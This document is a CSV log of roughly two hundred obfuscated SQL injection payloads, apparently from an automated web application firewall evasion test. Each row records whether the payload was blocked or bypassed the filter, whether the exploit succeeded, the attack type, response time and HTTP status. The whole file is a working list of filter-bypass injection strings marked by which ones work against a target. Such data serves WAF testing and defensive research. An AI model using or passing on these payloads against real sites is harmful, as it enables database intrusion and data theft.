Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@!=1%0b||%0bnot+{x%0b(select+1)}=1=,Bypassed,No,None,Unknown,0.018,70.51,No,500
0%27<@!=1.%0bor+not~false=+(!+,Bypassed,Yes,unionAtk,booleanAtk,0.0157,70.51,No,200
0%27<@!=.1+or+{x%0b(select+1)}=1+like%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0135,70.51,No,200
0'<@=1+||%0b!%7efalse=+(not+,Blocked,No,None,Unknown,0.0085,70.51,No,403
0%27<@!=.1+||%0b!+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0148,70.51,No,200
0'<@!=1.+||+not%0b{x+(select%0b1)}=1=,Bypassed,No,None,Unknown,0.0106,70.51,No,500
0'<@=1%0b||+{x%0b(select+1)}=1+like+{`if`,Bypassed,No,None,Unknown,0.0168,70.51,No,500
0%27<@=1+||%0bnot+{x+(select+1)}=1=%0b,Blocked,No,None,Unknown,0.012,70.51,No,403
0%27<@=1.+or%0b!+{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0117,70.51,No,200
0%27<@=.1+||+not+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0178,70.51,No,403
0%27<@=1+or+{x+(select+1)}=1%0blike+true,Blocked,No,None,booleanAtk,0.0122,70.51,No,403
0%27<@=.1+||%0b!%0b{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0127,70.51,No,200
0'<@=1.%0bor%0b!%0b{x+(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0143,70.51,No,500
0'<@=.1+||+!+1=+(!+,Bypassed,No,None,Unknown,0.0174,70.51,No,500
0%27<@=1+||+!%0b{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0098,70.75,No,200
0%27<@=1.+or+!~0=+(not+,Bypassed,Yes,unionAtk,Unknown,0.019,70.75,No,200
0%27<@!=.1+||%0b!+1=%0b(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0073,69.53,No,200
0%27<@=1%0b||%0bnot%0b{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0132,70.28,No,200
0'<@!=1+||%0bnot+{x%0b(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0122,70.28,No,500
0'||%0b1<@.%0bor+{a+1}=1%0blike%0b{x,Bypassed,No,None,Unknown,0.0088,70.28,No,500
0'<@!=.1%0b||+not+{x%0b(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0076,70.28,No,500
0%27<@=1.%0bor%0b!+1=+(not+,Bypassed,Yes,unionAtk,Unknown,0.0135,70.28,No,200
0%27<@!=1.%0b||%0bnot%0b{`if`%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0179,70.28,No,200
0'<@!=1+or+!%0b{x+(select+1)}=1=,Bypassed,No,None,Unknown,0.0132,70.28,No,500
0%27<@!=1.+||%0bnot+{`if`%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0131,70.28,No,200
0%27<@=.1+||%0b!+{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0065,70.28,No,403
0%27<@!=1.%0b||+not+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0164,70.28,No,200
0%27<@!=1.%0bor%0b!+1=+(not+,Bypassed,Yes,unionAtk,Unknown,0.0092,70.28,No,200
0%27||+!@<@.+or+not%0b{`if`+1}=1=,Bypassed,Yes,unionAtk,Unknown,0.0144,70.28,No,200
0%27<@!=1.+||%0b0=%0b(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0126,70.28,No,200
0%27<@=.1+||%0bnot%0b{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0101,70.28,No,200
0%27<@=1.%0bor+not%0b{x+(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0115,70.28,No,200
0'<@=1+||%0b!+{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0153,70.28,No,500
0%27<@=1+or+!%0b{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0112,70.28,No,200
0'<@!=1.%0b||%0bnot%0b{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0092,70.28,No,500
0%27<@=1.%0bor%0bnot+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0117,70.28,No,200
0%27<@!=.1%0b||%0bnot%0b{x+(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0186,70.28,No,200
0%27<@!=1+||+!+{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0142,70.28,No,200
0'<@=1.%0b||%0b!%7efalse=+(!+,Bypassed,No,None,Unknown,0.011,70.39,No,500
0%27<@!=1%0b||%0b!+{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0072,70.5,No,200
0'<@!=.1%0bor+!%0b{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0134,70.5,No,500
0%27<@!=.1%0bor%0b!%0b{x+(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0128,70.5,No,200
0'<@=1.+||%0b!%0b{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.016,70.5,No,403
0'<@!=1.+||%0b!+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0114,70.51,No,403
0%27<@!=1%0b||%0b!+{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0168,70.51,No,200
0'<@=1+||%0bnot%0b{x%0b(select+1)}=1=%0b,Blocked,No,None,Unknown,0.0104,70.51,No,403
0'<@!=.1+||+!%0b1=+(!%0b,Bypassed,No,None,Unknown,0.0161,70.51,No,500
0%27or%0b1<@+||+{a+1}=1%0blike+{a,Bypassed,Yes,unionAtk,Unknown,0.0208,70.51,No,200
0%27<@!=1%0bor+not%0b1=%0b(!%0b,Bypassed,Yes,unionAtk,Unknown,0.0152,70.51,No,200
0%27<@=1.+or+not%0b1=%0b(not,Bypassed,Yes,unionAtk,Unknown,0.0168,70.51,No,200
0'<@=1%0b||+!+{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.014,70.51,No,500
0'or+1<@.+or+not~false=%0b(,Bypassed,No,None,booleanAtk,0.0122,70.51,No,500
0'<@!=1.+||%0b!%0b{x%0b(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0075,70.51,No,403
0%27<@=1+or+not%0b{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0168,70.51,No,200
0%27<@!=.1+||+!+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0209,70.51,No,200
0%27<@=1.+||+!+{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0129,70.51,No,200
0%27<@!=1.+||+not%0b{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0216,70.51,No,200
0'<@!=1%0bor+{a+1}=1+like+{x+(select,Bypassed,No,None,Unknown,0.0166,70.51,No,500
0'<@=.1+||%0bnot+{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.0199,70.51,No,500
0'<@!=.1%0bor%0b!~false=%0b(not+,Bypassed,No,None,booleanAtk,0.0091,70.51,No,500
0%27<@=1%0b||+!+1=+(not+,Bypassed,Yes,unionAtk,Unknown,0.0186,70.75,No,200
0%27<@!=1.%0b||+not+{x%0b(select%0b1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0193,70.75,No,200
0'<@=.1+or+!%0b{x+(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0264,70.75,No,500
0%27<@=1.+||%0bnot~false=%0b(not,Bypassed,Yes,unionAtk,Unknown,0.0122,70.75,No,200
0'<@!=.1%0b||%0bnot+{x+(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0109,70.75,No,500
0'<@=1+or%0bnot+{x%0b(select%0b1)}=1=,Bypassed,No,None,Unknown,0.0103,70.75,No,500
0'<@!=1.+||%0b!+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0164,69.63,No,403
0'<@=1%0b||+not+{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0109,70.28,No,500
0'<@!=1%0bor%0bnot%0b{x+(select+1)}=1=+,Bypassed,No,None,Unknown,0.008,70.28,No,500
0'<@=.1%0bor%0bnot+{x+(select+1)}=1=+,Bypassed,No,None,Unknown,0.013,70.28,No,500
0'or%0b!@<@.%0b||+0=+(not,Bypassed,No,None,Unknown,0.0105,70.28,No,500
0%27<@!=.1+or%0bnot~false=+(!%7e,Bypassed,Yes,unionAtk,booleanAtk,0.0102,70.28,No,200
0'<@=1+or+not+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.015,70.28,No,403
0'<@=1+or+not~0=+(not,Bypassed,No,None,Unknown,0.0049,70.28,No,500
0%27<@=1.+or+!+{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0119,70.28,No,200
0%27<@!=1%0bor+!+{x+(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0133,70.28,No,200
0%27<@!=.1+||%0bnot%0b{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0111,70.28,No,200
0'<@=1%0bor%0bnot+{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0094,70.28,No,500
0%27<@!=.1%0bor%0bnot%0b{x%0b(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0103,70.28,No,200
0'<@!=.1%0b||+not+true=+(not%0b,Bypassed,No,None,Unknown,0.0121,70.28,No,500
0%27<@!=1.%0bor%0bnot%0b{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0117,70.28,No,200
0%27<@!=.1%0b||+!+{a%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0137,70.28,No,200
0'<@=.1+or+not+{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.0178,70.28,No,500
0%27<@=1+or%0b!+{x+(select+1)}=1=%0b,Blocked,No,None,Unknown,0.0054,70.28,No,403
0%27<@=1.%0b||%0b{`if`+1}=1+like+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0168,70.28,No,200
0%27<@!=1+||+!+{x+(select%0b1)}=1=,Blocked,No,None,Unknown,0.008,70.28,No,403
0'<@!=1%0b||+!+{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0099,70.28,No,500
0'<@!=1.+or%0bnot+{x%0b(select%0b1)}=1=,Bypassed,No,None,Unknown,0.0138,70.28,No,500
0'<@=1.+or%0bnot%7e0=%0b(!+,Bypassed,No,None,Unknown,0.0186,70.28,No,500
0'<@!=.1+or%0b!%7e0=+(!,Bypassed,No,None,Unknown,0.0085,70.39,No,500
0'<@!=1%0bor+not+true=+(!%7e,Bypassed,No,None,booleanAtk,0.0101,70.5,No,500
0'<@!=1.+||%0b!+{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.013,70.5,No,500
0%27<@!=1+or%0bnot%0b{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0168,70.5,No,200
0%27<@=1%0bor+not+{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0157,70.5,No,200
0%27<@!=.1+or%0b!%7e0=+(not~,Bypassed,Yes,unionAtk,Unknown,0.0139,70.51,No,200
0%27<@!=1.%0b||+not+{x+(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0113,70.51,No,200
0%27<@!=.1+or+not%0b{x+(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0126,70.51,No,200
0%27<@!=.1+||+not~0=+(!~,Bypassed,Yes,unionAtk,Unknown,0.0165,70.51,No,200
0%27<@!=.1%0b||+!+{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0112,70.51,No,200
0%27<@!=.1+||+not+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0187,70.51,No,200
0'<@!=1+||+!%7e0=+(!,Bypassed,No,None,Unknown,0.0154,70.51,No,500
0%27<@!=1%0bor+!+{x+(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.016,70.51,No,200
0%27<@!=1.%0bor+not%0b{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.016,70.51,No,200
0%27<@!=.1%0bor+!%0b{x%0b(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0226,70.51,No,200
0%27<@=1.+or%0bnot+{x%0b(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0133,70.51,No,200
0%27<@=1%0bor%0b!~0=+(!+,Bypassed,Yes,unionAtk,Unknown,0.0143,70.51,No,200
0'<@!=1.+or%0bnot%0b{x%0b(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0102,70.51,No,403
0%27<@!=1%0bor%0bnot%0b{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0151,70.51,No,200
0%27<@!=.1+or%0b{x+(select%0b1)}=1%0blike%0b{`if`,Bypassed,Yes,unionAtk,Unknown,0.0159,70.51,No,200
0'<@!=1.%0b||+not%0b{x+(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.011,70.51,No,500
0%27<@=1.%0bor+not+{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0137,70.51,No,200
0'<@=1%0b||%0bnot%0b{x%0b(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0102,70.63,No,500
0'<@=.1+or+not+{x%0b(select+1)}=1=+,Bypassed,No,None,Unknown,0.0219,70.75,No,500
0%27<@!=.1+or+!+{x+(select+1)}=1=,Blocked,No,None,Unknown,0.0061,70.75,No,403
0'<@=1.%0b||%0b0=+(not%0b{`if`,Bypassed,No,None,Unknown,0.0102,70.75,No,500
0%27<@!=.1%0bor+not+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0138,70.75,No,200
0'<@!=1+or+false=%0b(!+{`if`,Bypassed,No,None,booleanAtk,0.0086,69.63,No,500
0'<@=1%0bor+false=+(not+{`if`,Bypassed,No,None,booleanAtk,0.0141,70.28,No,500
0'<@!=.1+or%0bnot%0b{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0094,70.28,No,500
0%27<@=1+||%0bnot%0b{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0112,70.28,No,403
0'<@=1%0b||%0b!~0=%0b(not+,Bypassed,No,None,Unknown,0.0157,70.28,No,500
0'<@!=1.+or+!+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0168,70.28,No,403
0'<@=1.%0bor+not+{x%0b(select+1)}=1=+,Bypassed,No,None,Unknown,0.0088,70.28,No,500
0%27<@=.1%0b||+not%0b{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0162,70.28,No,200
0%27<@!=.1%0bor%0b!%0b1=+(not%0b,Bypassed,Yes,unionAtk,Unknown,0.014,70.28,No,200
0%27<@!=1%0bor+!+{x%0b(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0256,70.28,No,200
0'<@=1+or+!%0btrue=+(not%0b,Bypassed,No,None,booleanAtk,0.0163,70.28,No,500
0%27<@=1.+||%0bnot+{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0113,70.28,No,200
0%27<@!=1%0bor+not+{x%0b(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0112,70.28,No,200
0'<@=1+||%0bnot+{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.0158,70.28,No,500
0'<@=1.+||+!%0b{x+(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0155,70.28,No,500
0%27<@=.1%0b||%0b!%7efalse=%0b(!%0b,Bypassed,Yes,unionAtk,Unknown,0.0119,70.28,No,200
0'<@=1%0b||+not%0b{`if`%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0059,70.28,No,500
0%27<@=.1+or%0b!%0b{x+(select+1)}=1=,Blocked,No,None,Unknown,0.0155,70.28,No,403
0%27<@!=1%0b||%0bnot%0b{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0106,70.28,No,200
0'<@!=1+||+!+{x%0b(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0125,70.28,No,500
0%27<@!=1.%0b||+not+{x%0b(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0151,70.28,No,200
0%27<@!=.1%0b||%0bnot%0b{x+(select+1)}=1+is,Bypassed,Yes,unionAtk,Unknown,0.0147,70.39,No,200
0%27||+@<@.+||%0bnot+{`if`%0b1}=1=,Bypassed,Yes,unionAtk,Unknown,0.014,70.5,No,200
0%27<@!=1+or+!~false=+(not,Bypassed,Yes,unionAtk,booleanAtk,0.0122,70.5,No,200
0%27<@=.1+||+!+{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0112,70.5,No,200
0%27<@=.1+or+not+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0146,70.5,No,200
0'<@=.1+||%0bnot%0b{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0142,70.5,No,500
0%27<@=1+or%0b!%0b{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0129,70.51,No,200
0'<@!=1.+||+not%0b{x+(select+1)}=1=,Bypassed,No,None,Unknown,0.0214,70.51,No,500
0%27<@!=1.+||+not+{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0176,70.51,No,200
0'<@!=1+or%0bnot%0b{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0101,70.51,No,403
0'<@!=.1+||%0b!%0b{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0119,70.51,No,403
0'<@!=1.%0bor%0bnot%0b{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0244,70.51,No,500
0%27<@!=1.+or+not%0b{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0163,70.51,No,200
0%27<@=1.%0b||+!+{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0142,70.51,No,200
0'<@!=1+or+not+{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0231,70.51,No,500
0'<@!=.1+or+!+{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0152,70.51,No,500
0'<@=.1+or+not%0b{x%0b(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0191,70.51,No,500
0'<@!=.1+||+!+1=%0b(not%0b,Bypassed,No,None,Unknown,0.0079,70.51,No,500
0%27<@=.1+or%0bnot+true=+(not+,Bypassed,Yes,unionAtk,booleanAtk,0.0087,70.51,No,200
0'<@=1%0bor+not+1=+(not+,Bypassed,No,None,Unknown,0.0132,70.51,No,500
0%27<@=.1%0b||+0=+(!+{x,Bypassed,Yes,unionAtk,Unknown,0.0155,70.51,No,200
0'or%0b@<@.+or%0b!~false=+(,Bypassed,No,None,booleanAtk,0.0113,70.51,No,500
0'<@!=.1+or+%7e%0bfalse=+(%7e,Blocked,No,None,booleanAtk,0.01,70.51,No,403
0%27<@!=1.+||%0b!%0b1=%0b(!%0b,Bypassed,Yes,unionAtk,Unknown,0.0131,70.63,No,200
0'<@!=.1+or+not%0b{x+(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0131,70.75,No,500
0%27<@=1%0bor+!%7efalse=%0b(!%0b,Bypassed,Yes,unionAtk,booleanAtk,0.0176,70.75,No,200
0'<@=.1%0b||+not+{x+(select+1)}=1=+,Bypassed,No,None,Unknown,0.0181,70.75,No,500
0%27<@=.1%0b||+!~false=+(not+,Bypassed,Yes,unionAtk,Unknown,0.0276,70.75,No,200
0%27<@=.1+||+{x+(select+1)}=1%0blike%0b{`if`,Blocked,No,None,Unknown,0.0062,70.75,No,403
0%27<@!=1+or+not+{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0103,69.63,No,200
0'<@=.1+or%0bnot~false=%0b(!+,Bypassed,No,None,booleanAtk,0.0142,70.28,No,500
0%27<@!=1.+or%0bnot+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0078,70.28,No,403
0%27<@=.1%0bor+not+{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0152,70.28,No,200
0%27<@=1.%0bor%0b!+true=+(not+,Bypassed,Yes,unionAtk,booleanAtk,0.0195,70.28,No,200
0%27<@=1+or%0b{x%0b(select%0b1)}=1+like%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0083,70.28,No,200
0'<@!=1.+or+!%0btrue=+(!%0b,Bypassed,No,None,booleanAtk,0.009,70.28,No,500
0%27or%0b@<@.+or+not+1=+(,Bypassed,Yes,unionAtk,Unknown,0.0114,70.28,No,200
0'<@=1.%0b||+!%0b{a+1}=1=+(,Bypassed,No,None,Unknown,0.0119,70.28,No,500
0'<@=.1+or%0bnot%7efalse=%0b(not+,Blocked,No,None,booleanAtk,0.0105,70.28,No,403
0'||+@<@.+or+1%0blike+{a+1}=1,Blocked,No,None,Unknown,0.0134,70.28,No,403
0'<@!=1.+or+!+{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0106,70.28,No,403
0'<@=1.+||%0b!+1=%0b(!~,Bypassed,No,None,Unknown,0.0176,70.28,No,500
0%27<@=1%0bor+!+{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.013,70.28,No,200
0%27<@=1%0bor+not%0b{x+(select%0b1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0154,70.28,No,200
0'<@=.1%0bor+{`if`%0b1}=1%0blike+{a%0b1}=1,Bypassed,No,None,Unknown,0.0123,70.28,No,500
0'<@=1.%0b||+not%0b{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0167,70.28,No,500
0%27<@=1.+or+!%0b{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0128,70.28,No,200
0%27<@=.1+or%0b!%0b{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0078,70.28,No,200
0'<@!=1%0bor%0bfalse=+(!%0b{`if`,Bypassed,No,None,booleanAtk,0.0152,70.28,No,500
0%27<@=1.%0bor%0bnot+{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0162,70.28,No,200
0'<@!=1.+||%0b!~0=+(not,Bypassed,No,None,Unknown,0.0118,70.28,No,500
0%27or%0b1<@.+||+{x%0b(select+1)}=1%0blike,Bypassed,Yes,unionAtk,Unknown,0.0111,70.28,No,200
0'<@=.1%0b||%0b!+{x%0b(select+1)}=1=+,Bypassed,No,None,Unknown,0.0115,70.39,No,500
0'<@!=.1+or+not+1=+(!,Bypassed,No,None,Unknown,0.0137,70.5,No,500
0'<@=1+or+!%0b{x%0b(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.011,70.5,No,500
0%27<@=1.%0b||+not~false=+(!,Bypassed,Yes,unionAtk,Unknown,0.0097,70.5,No,200
0%27<@!=.1%0bor+not%0b{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0119,70.5,No,200
0'<@!=1.%0bor%0bnot%0b{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0071,70.5,No,500
0%27<@!=1+or+not+{x%0b(select%0b1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0191,70.51,No,200
0%27<@!=1.+or+not+{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0126,70.51,No,403
